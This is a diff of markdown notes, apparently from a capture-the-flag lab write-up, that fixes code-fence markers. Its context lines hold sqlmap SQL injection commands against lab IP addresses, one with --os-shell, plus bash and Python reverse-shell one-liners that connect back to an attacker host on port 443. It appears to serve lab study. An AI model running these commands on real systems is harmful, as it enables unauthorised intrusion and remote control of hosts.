@@ -14,10 +14,10 @@ search= means it uses a db most likely
 
 ```bash
 sqlmap -u 'http://10.129.139.173/dashboard.php?search=any+query' --cookie="PHPSESSID=sisg1ttssvvugq3k9esm71pj3f"  
-```bash
+```
 ```
 bash -c "bash -i >& /dev/tcp/10.10.15.73/443 0>&1"
-```bash
+```
 ```python
 ```bash
  > python3 -c "import os,pty,socket;s=socket.socket();s.connect((\"YOUR_IP\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")"
@@ -26,7 +26,7 @@ bash -c "bash -i >& /dev/tcp/10.10.15.73/443 0>&1"
  Good command:
 ```
  sqlmap -u 'http://10.129.80.191/dashboard.php?search=any+query' --cookie="PHPSESSID=d6gsn6dg4vksjq3vebgnep8p01" --os-shell
-```bash
+```
 ```python
 Next payload to make it interactive:
 ```bash
